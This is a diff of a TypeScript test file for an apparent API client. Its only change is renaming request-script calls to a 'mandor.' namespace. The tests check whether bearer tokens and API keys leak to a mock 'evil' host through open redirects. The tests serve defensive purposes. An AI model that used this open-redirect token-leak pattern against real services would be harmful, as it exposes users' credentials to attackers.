@@ -41,15 +41,15 @@ describe('a send a script shaped, sent with a secret to an open redirect', () =>
         const shaped = [
             {
                 url: '{{baseUrl}}/echo',
-                ...scripts(`request.url = '${attack.origin}/open?to=${hop}';`),
+                ...scripts(`mandor.request.url = '${attack.origin}/open?to=${hop}';`),
             },
-            { url: '{{baseUrl}}/open', ...scripts(`request.query.set('to', '${hop}');`) },
-            { url: openTo(hop), ...scripts(`request.headers.set('X-Run', '1');`) },
+            { url: '{{baseUrl}}/open', ...scripts(`mandor.request.query.set('to', '${hop}');`) },
+            { url: openTo(hop), ...scripts(`mandor.request.headers.set('X-Run', '1');`) },
             {
                 method: 'POST',
                 url: openTo(hop),
                 body: { type: 'json' as const, content: '{}' },
-                ...scripts(`request.body = '{"next":1}';`),
+                ...scripts(`mandor.request.body = '{"next":1}';`),
             },
         ];
 
@@ -69,7 +69,7 @@ describe('a send a script shaped, sent with a secret to an open redirect', () =>
             url: openTo(`${attack.evil.url}/hop`),
             headers: [line('Authorization', 'Bearer {{token}}')],
             settings: { followAuthorizationOnRedirect: true },
-            ...scripts(`request.headers.set('X-Run', '1');`),
+            ...scripts(`mandor.request.headers.set('X-Run', '1');`),
         });
 
         expect(strippedOf(answer)).toContain('authorization');
@@ -81,7 +81,7 @@ describe('a send a script shaped, sent with a secret to an open redirect', () =>
             url: openTo(`${attack.evil.url}/hop`),
             auth: { type: 'bearer', token: '{{token}}' },
             settings: { followAuthorizationOnRedirect: true },
-            ...scripts(`request.headers.set('X-Run', '1');`),
+            ...scripts(`mandor.request.headers.set('X-Run', '1');`),
         });
 
         expect(answer.ok).toBe(true);
@@ -90,7 +90,10 @@ describe('a send a script shaped, sent with a secret to an open redirect', () =>
     });
 
     it('counts a line that reads a value of a script as shaped, with no script writing', async () => {
-        await attack.send({ url: '{{baseUrl}}/echo', ...scripts(`vars.set('n', '2');`) });
+        await attack.send({
+            url: '{{baseUrl}}/echo',
+            ...scripts(`mandor.variables.set('n', '2');`),
+        });
 
         const answer = await attack.send({
             url: openTo(`${attack.evil.url}/hop`),
@@ -107,7 +110,7 @@ describe('a send a script shaped, sent with a secret to an open redirect', () =>
             method: 'POST',
             url: openTo(`${attack.evil.url}/hop`),
             body: { type: 'text', content: '{{token}}' },
-            ...scripts(`request.headers.set('X-Run', '1');`),
+            ...scripts(`mandor.request.headers.set('X-Run', '1');`),
         });
 
         expect(answer).toMatchObject({ ok: true, value: { status: 307 } });
@@ -119,7 +122,7 @@ describe('a send a script shaped, sent with a secret to an open redirect', () =>
     it('stays at the 3xx when the location the server built holds the secret', async () => {
         const answer = await attack.send({
             url: `{{baseUrl}}/open?to=${encodeURIComponent(`${attack.evil.url}/x?k=`)}{{token}}`,
-            ...scripts(`request.headers.set('X-Run', '1');`),
+            ...scripts(`mandor.request.headers.set('X-Run', '1');`),
         });
 
         expect(answer).toMatchObject({ ok: true, value: { status: 307 } });
@@ -133,7 +136,7 @@ describe('a send a script shaped, sent with a secret to an open redirect', () =>
             url: openTo(`${attack.evil.url}/hop`, 302),
             headers: [KEY_LINE],
             body: { type: 'text', content: '{{token}}' },
-            ...scripts(`request.headers.set('X-Run', '1');`),
+            ...scripts(`mandor.request.headers.set('X-Run', '1');`),
         });
 
         expect(answer.ok).toBe(true);
@@ -153,14 +156,14 @@ describe('a redirect the scripts had no hand in, as today', () => {
         await attack.send({
             url: openTo(`${attack.evil.url}/hop`),
             headers: [KEY_LINE],
-            ...scripts(`test('has a key', () => request.headers.has('x-api-key'));`),
+            ...scripts(`mandor.test('has a key', () => mandor.request.headers.has('x-api-key'));`),
         });
 
         expect(attack.evil.hits[0]?.headers['x-api-key']).toBe(SECRET);
     });
 
     it('follows a shaped send with no secret, and a shaped hop that stays in the origin', async () => {
-        const shaping = scripts(`request.headers.set('X-Run', '1');`);
+        const shaping = scripts(`mandor.request.headers.set('X-Run', '1');`);
         const plain = await attack.send({
             url: openTo(`${attack.evil.url}/hop`),
             headers: [line('X-Api-Key', 'plain')],
